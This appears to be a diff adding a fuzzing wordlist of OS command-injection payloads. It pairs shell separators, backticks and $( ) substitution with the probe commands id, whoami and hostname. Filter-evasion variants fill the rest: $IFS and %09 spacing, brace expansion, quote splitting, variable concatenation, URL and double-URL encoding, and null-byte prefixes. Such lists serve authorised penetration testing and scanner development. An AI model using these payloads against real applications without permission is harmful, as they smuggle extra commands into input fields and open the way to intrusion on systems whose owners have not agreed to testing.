@@ -1,0 +1,86 @@
+;
+|
+&
+&&
+||
+`
+$(whoami)
+;
+|
+&
+&&
+||
+`
+;
+;
+;
+;
+; id
+| id
+& id
+&& id
+|| id
+`id`
+$(id)
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+`whoami`
+$(whoami)
+; hostname
+| hostname
+& hostname
+&& hostname
+|| hostname
+`hostname`
+$(hostname)
+;{id,}
+;{ls,-la}
+|{id,}
+|{ls,-la}
+;%09id
+|%09id
+&%09id
+&&%09id
+||%09id
+;id$IFS
+;ls$IFS-la
+|id$IFS
+|ls$IFS-la
+; who$@ami
+| who$@ami
+; who'am'i
+| who'am'i
+; a=id;$a
+| a=id;$a
+; a=whoami;$a
+; a=s;i=d;$a$b
+; a=who;b=ami;$a$b
+; sh <<< 'id'
+| sh <<< 'id'
+;%0Aid
+|%0Aid
+;%0Aid%0A
+|%0Aid%0A
+%0Aid%0A
+%3Bid
+%7Cid
+%26id
+%3Bwhoami
+%7Cwhoami
+%26whoami
+%253Bid
+%253Bwhoami
+%257Cid
+%257Cwhoami
+%2526id
+%2526whoami
+;%00id
+|%00id
+&%00id
+&&%00id
+||%00id
+;%00whoami
+|%00whoami
